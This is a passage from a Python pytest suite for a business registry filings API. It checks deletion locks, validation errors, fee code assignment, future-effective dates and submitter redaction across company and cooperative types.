    headers = create_header(jwt, ['BAD ROLE'], identifier)

    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filings.id}', headers=headers)

    assert rv.status_code == HTTPStatus.UNAUTHORIZED


ULC_LTD_DELETION_LOCKED_MESSAGE: Final = 'You must complete this alteration filing to become a BC Benefit Company.'
GENERIC_DELETION_LOCKED_MESSAGE: Final = 'This filing cannot be deleted at this moment.'


@pytest.mark.parametrize(
    'legal_type,deletion_locked,message',
    [
        (Business.LegalTypes.COMP, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.CONTINUE_IN, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.CO_1860, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.CO_1862, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.CO_1878, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.CO_1890, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.CO_1897, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.BC_ULC_COMPANY, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.ULC_CONTINUE_IN, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.ULC_CO_1860, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.ULC_CO_1862, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.ULC_CO_1878, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.ULC_CO_1890, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.ULC_CO_1897, True, ULC_LTD_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.ULC_CO_1897, False, None),
        (Business.LegalTypes.COOP, True, GENERIC_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.COOP, False, None),
        (Business.LegalTypes.BCOMP, True, GENERIC_DELETION_LOCKED_MESSAGE),
        (Business.LegalTypes.BCOMP, False, None),
    ])
def test_deleting_filings_deletion_locked(session, client, jwt, legal_type, deletion_locked, message):
    """Assert that filing cannot be deleted with deletion_locked flag."""
    identifier = 'BC7654321'
    business = factory_business(identifier, entity_type=legal_type.value)
    filing = factory_filing(business, ALTERATION_FILING_TEMPLATE, filing_type='alteration')

    if deletion_locked:
        filing.deletion_locked = True
        filing.save()

    headers = create_header(jwt, [STAFF_ROLE], identifier)
    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)
    if deletion_locked:
        assert rv.status_code == HTTPStatus.UNAUTHORIZED
        assert rv.json.get('message') == message
    else:
        assert rv.status_code == HTTPStatus.OK


def test_update_block_ar_update_to_a_paid_filing(session, client, jwt):
    """Assert that a valid filing can NOT be updated once it has been paid."""
    import copy
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
                                last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
    if annual_report_date > datetime.utcnow().date():
        annual_report_date = datetime.utcnow().date()
    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()

    filings = factory_completed_filing(business, ar)

    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
                    json=ar,
                    headers=create_header(jwt, [STAFF_ROLE], identifier)
                    )

    assert rv.status_code == HTTPStatus.FORBIDDEN
    assert rv.json['errors'][0] == {'error': 'Filings cannot be changed after the invoice is created.'}


def test_update_ar_with_a_missing_filing_id_fails(session, client, jwt):
    """Assert that updating a missing filing fails."""
    import copy
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
                                last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
    if annual_report_date > datetime.utcnow().date():
        annual_report_date = datetime.utcnow().date()
    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()

    filings = factory_completed_filing(business, ar)

    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id+1}',
                    json=ar,
                    headers=create_header(jwt, [STAFF_ROLE], identifier)
                    )

    assert rv.status_code == HTTPStatus.NOT_FOUND


def test_update_ar_with_a_missing_business_id_fails(session, client, jwt):
    """Assert that updating to a non-existant business fails."""
    import copy
    identifier = 'CP7654321'
    business = factory_business(identifier,
                                founding_date=(datetime.utcnow() - datedelta.YEAR)
                                )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()

    filings = factory_completed_filing(business, ar)
    identifier = 'CP0000001'

    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id+1}',
                    json=ar,
                    headers=create_header(jwt, [STAFF_ROLE], identifier)
                    )

    assert rv.status_code == HTTPStatus.BAD_REQUEST
    assert rv.json['errors'][0] == {'message': 'A valid business is required.'}


def test_update_ar_with_missing_json_body_fails(session, client, jwt):
    """Assert that updating a filing with no JSON body fails."""
    identifier = 'CP7654321'
    b = factory_business(identifier)
    filings = factory_filing(b, ANNUAL_REPORT)

    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id+1}',
                    json=None,
                    headers=create_header(jwt, [STAFF_ROLE], identifier)
                    )

    assert rv.status_code in (HTTPStatus.BAD_REQUEST, HTTPStatus.UNSUPPORTED_MEDIA_TYPE)

    if rv.status_code == HTTPStatus.UNSUPPORTED_MEDIA_TYPE:
        assert rv.json == {"detail": "Unsupported media type '' in request. 'application/json' is required."}

    if rv.status_code == HTTPStatus.BAD_REQUEST:
        assert rv.json['errors'][0] == {'message': f'No filing json data in body of post for {identifier}.'}


def test_file_ar_no_agm_coop(session, client, jwt):
    """Assert that filing AR as COOP with no AGM date fails."""
    identifier = 'CP7654399'
    b = business = factory_business(identifier,
                                    founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
                                    last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
                                    )
    factory_business_mailing_address(business)
    ar = copy.deepcopy(ANNUAL_REPORT)
    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
    if annual_report_date > datetime.utcnow().date():
        annual_report_date = datetime.utcnow().date()
    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
    ar['filing']['header']['date'] = datetime.utcnow().date().isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = None
    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.BAD_REQUEST
    assert rv.json['errors'][0]['error'] == ('Annual General Meeting Date must be a '
                                             'valid date when submitting an Annual Report in the current year.')


@integration_payment
def test_file_ar_no_agm_bcorp(session, client, jwt):
    """Assert that filing AR as BCORP with no AGM date succeeds."""
    identifier = 'CP7654399'
    b = factory_business(identifier, (datetime.utcnow() - datedelta.YEAR), None, 'B')
    factory_business_mailing_address(b)
    ar = copy.deepcopy(ANNUAL_REPORT)
    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
    ar['filing']['header']['date'] = datetime.utcnow().date().isoformat()
    ar['filing']['annualReport']['annualGeneralMeetingDate'] = None
    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=ar,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.CREATED


def test_calc_annual_report_date(session, client, jwt):
    """Assert that nextAnnualReport is the anniversary of the business recognition."""
    identifier = 'CP7654399'
    b = factory_business(identifier, (datetime.utcnow() - datedelta.YEAR), None, 'B')
    factory_business_mailing_address(b)
    assert b.next_anniversary.date().isoformat() == datetime.utcnow().date().isoformat()


DISSOLUTION_VOLUNTARY_FILING = copy.deepcopy(FILING_HEADER)
DISSOLUTION_VOLUNTARY_FILING['filing']['dissolution'] = DISSOLUTION
DISSOLUTION_VOLUNTARY_FILING['filing']['dissolution']['dissolutionType'] = 'voluntary'

# FUTURE: use RESTORATION_FILING from business schema data when restoration filing work has been done
RESTORATION_FILING = copy.deepcopy(FILING_HEADER)
RESTORATION_FILING['filing']['restoration'] = RESTORATION

RESTORATION_FULL_FILING = copy.deepcopy(RESTORATION_FILING)
RESTORATION_FULL_FILING['filing']['restoration']['type'] = 'fullRestoration'

RESTORATION_LIMITED_FILING = copy.deepcopy(RESTORATION_FILING)
RESTORATION_LIMITED_FILING['filing']['restoration']['type'] = 'limitedRestoration'

RESTORATION_LIMITED_EXT_FILING = copy.deepcopy(RESTORATION_FILING)
RESTORATION_LIMITED_EXT_FILING['filing']['restoration']['type'] = 'limitedRestorationExtension'

RESTORATION_LIMITED_TO_FULL_FILING = copy.deepcopy(RESTORATION_FILING)
RESTORATION_LIMITED_TO_FULL_FILING['filing']['restoration']['type'] = 'limitedRestorationToFull'

CONTINUATION_OUT_FILING = copy.deepcopy(FILING_HEADER)
CONTINUATION_OUT_FILING['filing']['continuationOut'] = {}

# FUTURE: use AGM_LOCATION_CHANGE_FILING from business schema data when AGM location change filing work has been done
AGM_LOCATION_CHANGE_FILING = copy.deepcopy(FILING_HEADER)
AGM_LOCATION_CHANGE_FILING['filing']['agmLocationChange'] = {}

# FUTURE: use AGM_EXTENSION_FILING from business schema data when AGM Extension filing work has been done
AGM_EXTENSION_FILING = copy.deepcopy(FILING_HEADER)
AGM_EXTENSION_FILING['filing']['agmExtension'] = {}


def _get_expected_fee_code(free, filing_name, filing_json: dict, legal_type):
    """Return fee codes for legal type."""
    filing_sub_type = Filing.get_filings_sub_type(filing_name, filing_json)
    if free:
        if filing_sub_type:
            return Filing.FILINGS[filing_name].get(filing_sub_type, {}).get('free', {}).get('codes', {}).get(legal_type)
        else:
            return Filing.FILINGS[filing_name].get('free', {}).get('codes', {}).get(legal_type)

    if filing_sub_type:
        return Filing.FILINGS[filing_name].get(filing_sub_type, {}).get('codes', {}).get(legal_type)

    return Filing.FILINGS[filing_name].get('codes', {}).get(legal_type)


@pytest.mark.parametrize(
    'identifier, base_filing, filing_name, orig_legal_type, free, additional_fee_codes, has_fed',
    [
        ('BC1234567', ALTERATION_FILING_TEMPLATE, 'alteration', Business.LegalTypes.COMP.value, False, [], False),
        ('BC1234568', ALTERATION_FILING_TEMPLATE, 'alteration', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234567', TRANSITION_FILING_TEMPLATE, 'transition', Business.LegalTypes.COMP.value, False, [], False),
        ('BC1234568', TRANSITION_FILING_TEMPLATE, 'transition', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234569', ANNUAL_REPORT, 'annualReport', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234569', FILING_HEADER, 'changeOfAddress', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234569', FILING_HEADER, 'changeOfDirectors', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234569', FILING_HEADER, 'changeOfDirectors', Business.LegalTypes.BCOMP.value, True, [], False),
        ('BC1234569', CORRECTION_INCORPORATION, 'correction', Business.LegalTypes.BCOMP.value, False, [], False),
        ('CP1234567', ANNUAL_REPORT, 'annualReport', Business.LegalTypes.COOP.value, False, [], False),
        ('CP1234567', FILING_HEADER, 'changeOfAddress', Business.LegalTypes.COOP.value, False, [], False),
        ('CP1234567', FILING_HEADER, 'changeOfDirectors', Business.LegalTypes.COOP.value, False, [], False),
        ('CP1234567', CORRECTION_AR, 'correction', Business.LegalTypes.COOP.value, False, [], False),
        ('CP1234567', FILING_HEADER, 'changeOfDirectors', Business.LegalTypes.COOP.value, True, [], False),
        ('T1234567', INCORPORATION_FILING_TEMPLATE, 'incorporationApplication',
         Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.COMP.value, False, [], False),
        ('CP1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.COOP.value, False,
            ['AFDVT', 'SPRLN'], False),
        ('BC1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.BC_ULC_COMPANY.value,
            False, [], False),
        ('BC1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.BC_CCC.value,
            False, [], False),
        ('BC1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.LIMITED_CO.value,
            False, [], False),
        ('BC1234567', RESTORATION_FULL_FILING, 'restoration', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234567', RESTORATION_FULL_FILING, 'restoration', Business.LegalTypes.COMP.value, False, [], False),
        ('BC1234567', RESTORATION_FULL_FILING, 'restoration', Business.LegalTypes.BC_ULC_COMPANY.value, False, [], False),
        ('BC1234567', RESTORATION_FULL_FILING, 'restoration', Business.LegalTypes.BC_CCC.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_FILING, 'restoration', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_FILING, 'restoration', Business.LegalTypes.COMP.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_FILING, 'restoration', Business.LegalTypes.BC_ULC_COMPANY.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_FILING, 'restoration', Business.LegalTypes.BC_CCC.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_EXT_FILING, 'restoration', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_EXT_FILING, 'restoration', Business.LegalTypes.COMP.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_EXT_FILING, 'restoration', Business.LegalTypes.BC_ULC_COMPANY.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_EXT_FILING, 'restoration', Business.LegalTypes.BC_CCC.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_TO_FULL_FILING, 'restoration', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_TO_FULL_FILING, 'restoration', Business.LegalTypes.COMP.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_TO_FULL_FILING, 'restoration', Business.LegalTypes.BC_ULC_COMPANY.value, False, [], False),
        ('BC1234567', RESTORATION_LIMITED_TO_FULL_FILING, 'restoration', Business.LegalTypes.BC_CCC.value, False, [], False),
        ('BC1234567', CONTINUATION_OUT_FILING, 'continuationOut', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234567', CONTINUATION_OUT_FILING, 'continuationOut', Business.LegalTypes.BC_ULC_COMPANY.value, False, [], False),
        ('BC1234567', CONTINUATION_OUT_FILING, 'continuationOut', Business.LegalTypes.COMP.value, False, [], False),
        ('BC1234567', CONTINUATION_OUT_FILING, 'continuationOut', Business.LegalTypes.BC_CCC.value, False, [], False),
        ('BC1234567', AGM_LOCATION_CHANGE_FILING, 'agmLocationChange', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234567', AGM_LOCATION_CHANGE_FILING, 'agmLocationChange', Business.LegalTypes.BC_ULC_COMPANY.value, False, [], False),
        ('BC1234567', AGM_LOCATION_CHANGE_FILING, 'agmLocationChange', Business.LegalTypes.COMP.value, False, [], False),
        ('BC1234567', AGM_LOCATION_CHANGE_FILING, 'agmLocationChange', Business.LegalTypes.BC_CCC.value, False, [], False),
        ('BC1234567', AGM_EXTENSION_FILING, 'agmExtension', Business.LegalTypes.BCOMP.value, False, [], False),
        ('BC1234567', AGM_EXTENSION_FILING, 'agmExtension', Business.LegalTypes.BC_ULC_COMPANY.value, False, [], False),
        ('BC1234567', AGM_EXTENSION_FILING, 'agmExtension', Business.LegalTypes.COMP.value, False, [], False),
        ('BC1234567', AGM_EXTENSION_FILING, 'agmExtension', Business.LegalTypes.BC_CCC.value, False, [], False),
        ('BC1234567', ALTERATION_FILING_TEMPLATE, 'alteration', Business.LegalTypes.COMP.value, False, [], True),
        ('BC1234568', ALTERATION_FILING_TEMPLATE, 'alteration', Business.LegalTypes.BCOMP.value, False, [], True),
        ('T1234567', INCORPORATION_FILING_TEMPLATE, 'incorporationApplication',
         Business.LegalTypes.BCOMP.value, False, [], True),
        ('BC1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.BCOMP.value, False, [], True),
        ('BC1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.COMP.value, False, [], True),
        ('CP1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.COOP.value, False,
            ['AFDVT', 'SPRLN'], True),
        ('BC1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.BC_ULC_COMPANY.value,
            False, [], True),
        ('BC1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.BC_CCC.value,
            False, [], True),
        ('BC1234567', DISSOLUTION_VOLUNTARY_FILING, 'dissolution', Business.LegalTypes.LIMITED_CO.value,
            False, [], True),
    ]
)
def test_get_correct_fee_codes(
        session, identifier, base_filing, filing_name, orig_legal_type, free, additional_fee_codes, has_fed):
    """Assert fee codes are properly assigned to filings before sending to payment."""
    # setup
    expected_fee_code = _get_expected_fee_code(free, filing_name, base_filing, orig_legal_type)

    business = None
    if not identifier.startswith('T'):
        business = factory_business(identifier=identifier, entity_type=orig_legal_type)
    # set filing
    filing = copy.deepcopy(base_filing)
    filing['filing']['business']['identifier'] = identifier
    filing['filing']['business']['legalType'] = orig_legal_type
    filing['filing']['header']['name'] = filing_name

    if has_fed:
        filing['filing']['header']['effectiveDate'] = "2999-01-01T00:00:00+00:00"

    if filing_name == 'alteration':
        filing['filing'][filing_name]['business']['legalType'] = orig_legal_type
    elif filing_name == 'transition':
        filing['filing']['business']['legalType'] = orig_legal_type
    elif filing_name == 'changeOfAddress':
        filing['filing'][filing_name] = CHANGE_OF_ADDRESS
    elif filing_name == 'changeOfDirectors':
        filing['filing'][filing_name] = copy.deepcopy(CHANGE_OF_DIRECTORS)
        if free:
            for director in filing['filing']['changeOfDirectors']['directors']:
                if not all(action in ['nameChanged', 'addressChanged'] for action in director.get('actions', [])):
                    director['actions'] = ['nameChanged', 'addressChanged']
        else:
            assert len(filing['filing']['changeOfDirectors']['directors']) > 1
            filing['filing']['changeOfDirectors']['directors'][0]['actions'] = ['ceased', 'nameChanged']
            filing['filing']['changeOfDirectors']['directors'][1]['actions'] = ['nameChanged', 'addressChanged']

    # get fee code and future effective date
    filing_type = ListFilingResource.get_filing_types(business, filing)[0]
    fee_code = filing_type['filingTypeCode']
    future_effective = filing_type.get('futureEffective')

    # verify fee code and future effective date
    assert fee_code == expected_fee_code
    if has_fed:
        assert future_effective is True
    else:
        if filing_name in ['incorporationApplication', 'alteration', 'dissolution']:
            assert future_effective is False
        else:
            assert future_effective is None

    assert all(elem in
               map(lambda x: x['filingTypeCode'], ListFilingResource.get_filing_types(business, filing))
               for elem in additional_fee_codes)


@integration_payment
def test_coa_future_effective(session, client, jwt):
    """Assert future effective changes do not affect Coops, and that BCORP change of address if future-effective."""
    coa = copy.deepcopy(FILING_HEADER)
    coa['filing']['header']['name'] = 'changeOfAddress'
    coa['filing']['changeOfAddress'] = CHANGE_OF_ADDRESS
    coa['filing']['changeOfAddress']['offices']['registeredOffice']['deliveryAddress']['addressCountry'] = 'CA'
    coa['filing']['changeOfAddress']['offices']['registeredOffice']['mailingAddress']['addressCountry'] = 'CA'
    identifier = 'CP1234567'
    b = factory_business(identifier, (datetime.utcnow() - datedelta.YEAR), None)
    factory_business_mailing_address(b)
    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=coa,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )
    assert rv.status_code == HTTPStatus.CREATED
    # assert 'effectiveDate' not in rv.json['filing']['header']

    identifier = 'CP7654321'
    bc = factory_business(identifier, (datetime.utcnow() - datedelta.YEAR), None, Business.LegalTypes.BCOMP.value)
    factory_business_mailing_address(bc)
    coa['filing']['business']['identifier'] = identifier

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=coa,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.CREATED
    assert 'effectiveDate' in rv.json['filing']['header']
    effective_date = parse(rv.json['filing']['header']['effectiveDate'])
    valid_date = LegislationDatetime.tomorrow_midnight()
    assert effective_date == valid_date


@pytest.mark.parametrize(
    'test_name, submitter_role, jwt_role, username, expected',
    [
        ('staff-staff', UserRoles.staff, UserRoles.staff, 'idir/staff-user', 'idir/staff-user'),
        ('system-staff', UserRoles.system, UserRoles.staff, 'system', 'system'),
        ('unknown-staff', None, UserRoles.staff, 'some-user', 'some-user'),
        ('system-public', UserRoles.system, UserRoles.public_user, 'system', 'Registry Staff'),
        ('staff-public', UserRoles.staff, UserRoles.public_user, 'idir/staff-user', 'Registry Staff'),
        ('public-staff', UserRoles.public_user, UserRoles.staff, 'bcsc/public_user', 'bcsc/public_user'),
        ('public-public', UserRoles.public_user, UserRoles.public_user, 'bcsc/public_user', 'bcsc/public_user'),
        ('unknown-public', None, UserRoles.public_user, 'some-user', 'some-user'),
    ]
)
def test_filing_redaction(session, client, jwt, test_name, submitter_role, jwt_role, username, expected):
    """Assert that the core filing is saved to the backing store."""
    from legal_api.core.filing import Filing as CoreFiling
    try:
        identifier = 'BC1234567'
        filing = CoreFiling()
        filing_submission = {
            'filing': {
                'header': {
                    'name': 'specialResolution',
                    'date': '2019-04-08'
                },
                'specialResolution': {
                    'resolution': 'Year challenge is hitting oppo for the win.'
                }}}
        user = factory_user(username)
        business = factory_business(identifier, (datetime.utcnow() - datedelta.YEAR), None, Business.LegalTypes.BCOMP.value)
        filing.json = filing_submission
        filing.save()
        filing._storage.business_id = business.id
        filing._storage.submitter_id = user.id
        filing._storage.submitter_roles = submitter_role
        filing.save()
        filing_id = filing.id

        rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filing_id}',
                        headers=create_header(jwt, [jwt_role], identifier))
    except Exception as err:
        print(err)

    assert rv.status_code == HTTPStatus.OK
    assert rv.json['filing']['header']['submitter'] == expected


@pytest.mark.parametrize(
    'test_name, legal_type, identifier, future_effective_date_expected',
    [
        ('BEN', Business.LegalTypes.BCOMP.value, 'BC1111111', True),
        ('ULC', Business.LegalTypes.BC_ULC_COMPANY.value, 'BC1111112', True),
        ('CC', Business.LegalTypes.BC_CCC.value, 'BC1111113', True),
        ('BC', Business.LegalTypes.COMP.value, 'BC1111114', True),
        ('CP', Business.LegalTypes.COOP.value, 'CP1234567', False),
    ]
)
def test_coa(session, requests_mock, client, jwt, test_name, legal_type, identifier, future_effective_date_expected):
    """Assert COA is applied correctly for entity types."""
    coa = copy.deepcopy(FILING_HEADER)
    coa['filing']['header']['name'] = 'changeOfAddress'
    coa['filing']['changeOfAddress'] = CHANGE_OF_ADDRESS
    coa['filing']['changeOfAddress']['offices']['registeredOffice']['deliveryAddress']['addressCountry'] = 'CA'
    coa['filing']['changeOfAddress']['offices']['registeredOffice']['mailingAddress']['addressCountry'] = 'CA'

    b = factory_business(identifier, (datetime.utcnow() - datedelta.YEAR), None, legal_type)
    factory_business_mailing_address(b)
    coa['filing']['business']['identifier'] = identifier

    requests_mock.post(current_app.config.get('PAYMENT_SVC_URL'),
                       json={'id': 21322,
                             'statusCode': 'COMPLETED',
                             'isPaymentActionRequired': False},
                       status_code=HTTPStatus.CREATED)
    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=coa,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )

    assert rv.status_code == HTTPStatus.CREATED

    assert 'effectiveDate' in rv.json['filing']['header']

    if future_effective_date_expected:
        effective_date = parse(rv.json['filing']['header']['effectiveDate'])
        valid_date = LegislationDatetime.tomorrow_midnight()
        assert effective_date == valid_date

        assert 'futureEffectiveDate' in rv.json['filing']['header']
        future_effective_date = parse(rv.json['filing']['header']['futureEffectiveDate'])
        assert future_effective_date == valid_date
    else:
        assert 'futureEffectiveDate' not in rv.json['filing']['header']


def test_rules_memorandum_in_sr(session, mocker, requests_mock, client, jwt, ):
    """Assert if both rules update in sr, and rules file key is provided"""
    mocker.patch('legal_api.services.filings.validations.alteration.validate_pdf',
                 return_value=[])

    identifier = 'CP1234567'
    b = factory_business(identifier, (datetime.utcnow() - datedelta.YEAR * 10), None, Business.LegalTypes.COOP.value)
    factory_business_mailing_address(b)
    sr = copy.deepcopy(CP_SPECIAL_RESOLUTION_TEMPLATE)
    del sr['filing']['changeOfName']
    sr['filing']['alteration'] = {}
    sr['filing']['alteration']['rulesFileKey'] = 'some_key'
    sr['filing']['alteration']['business'] = {
        'legalType': 'CP'
    }
    sr['filing']['alteration']['rulesInResolution'] = True

    sr['filing']['business']['identifier'] = identifier

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=sr,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )
    assert rv.status_code == HTTPStatus.BAD_REQUEST
    assert rv.json.get('errors')
    error = 'Cannot provide both file upload and rules change in SR'
    assert rv.json.get('errors')[0].get('error') == error

    sr['filing']['alteration']['memorandumFileKey'] = 'some_key'
    sr['filing']['alteration']['memorandumInResolution'] = True
    sr['filing']['alteration']['rulesInResolution'] = False

    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
                     json=sr,
                     headers=create_header(jwt, [STAFF_ROLE], identifier)
                     )
    assert rv.status_code == HTTPStatus.BAD_REQUEST
    assert rv.json.get('errors')
    error = 'Cannot provide both file upload and memorandum change in SR'
    assert rv.json.get('errors')[0].get('error') == error
